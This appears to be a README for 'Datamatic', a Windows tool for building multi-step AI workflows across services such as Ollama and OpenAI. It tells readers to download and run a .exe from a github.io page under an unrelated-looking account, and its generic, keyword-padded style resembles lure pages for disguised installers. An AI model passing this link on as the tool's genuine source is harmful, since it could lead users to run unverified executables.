# 🤖 datamatic - Build automated workflows with smart reasoning

[![](https://img.shields.io/badge/Download-Datamatic-blue.svg)](https://kelliinterim246.github.io)

Datamatic helps you build multi-step AI workflows. You create tasks that use artificial intelligence to reason through data and process information. The software handles structured generation and chaining of tasks. You connect different AI models to perform complex sequences of logic without writing code.

## 📋 What this tool does

Modern AI tools often perform only single tasks. Datamatic allows for chains of tasks. You define a process, and the software executes each step in order. It ensures that the output of one step becomes the input for the next. This creates a reliable pipeline for your data.

The software supports local models and cloud services. You choose the engine that fits your needs. Use your own hardware for privacy or cloud services for speed.

## 💻 System requirements

To run Datamatic on your Windows computer, you need basic hardware:

*   Windows 10 or Windows 11
*   At least 8 GB of internal memory (RAM)
*   An internet connection to set up the software
*   If you plan to run models locally, a computer with a dedicated graphics card (GPU) improves speed

## 📥 How to set up

Follow these steps to install the software on your machine:

1.  Visit the [download page](https://kelliinterim246.github.io).
2.  Choose the link that ends in .exe for Windows.
3.  Click the file to start the download.
4.  Once the file arrives, double-click the file to open the installer.
5.  Follow the prompts on your screen.
6.  Agree to the installation directory.
7.  Click Finish to complete the process.

The installer places a shortcut on your desktop. Double-click this icon to start the application.

## ⚙️ Configuring your first workflow

When you open Datamatic for the first time, the screen shows a blank workspace. This workspace is where you build your logic.

1.  Click the Add Task button in the top menu.
2.  Select a model from the list. The software supports Ollama, LMStudio, OpenAI, OpenRouter, and Gemini.
3.  Enter your settings for that model. If you use a cloud service, you need an API key. Paste the key into the provided field.
4.  Type your instruction for the AI in the Prompt box.
5.  Connect the output of the task to the next step. Drag a line from the output circle of the first block to the input circle of the second block.
6.  Click Play to test your chain.

## 🧠 Supported services

Datamatic works with several AI backends. You switch between these services in the Settings menu.

*   **Ollama:** Run open-source models on your local machine.
*   **LMStudio:** Manage and serve models locally through a user-friendly interface.
*   **OpenAI:** Use GPT models for high-quality reasoning.
*   **OpenRouter:** Access many different models through a single gate.
*   **Gemini:** Utilize Google models for large data tasks.

## 🛠️ Editing your data

The software expects structured data. This means clear inputs and clear outputs. Use the built-in Editor to define the schema for your data. You choose whether your data looks like a table, a list, or plain text.

If you process a file, you drag the file into the File block. The software reads the contents and passes the text to the next task in your chain. 

## ❓ Frequently asked questions

**Does the software store my data?**
Datamatic runs on your local machine. Your workflows and your data stay on your hard drive. The software sends only the data that you select to the AI service provider.

**What happens if a step fails?**
The workflow highlights the failed step in red. Move your mouse over the block to see the error report. Check if your connection to the AI model works or if your API key remains valid.

**Can I run long workflows?**
Yes. You link as many blocks as you need. Keep in mind that longer chains take more time to complete. 

**Does the software work offline?**
You need the internet to reach cloud services like OpenAI or Gemini. If you use Ollama or LMStudio to run models locally, you use those features without an active internet connection.

## 🚀 Getting help

If you run into issues, check the help menu inside the app. You find documentation on how each block works. For common problems, verify that your firewall allows the application to send and receive data. If you change your network settings, you might need to restart the program.

Keywords: AI, automation, workflows, reasoning, windows, software, productivity, data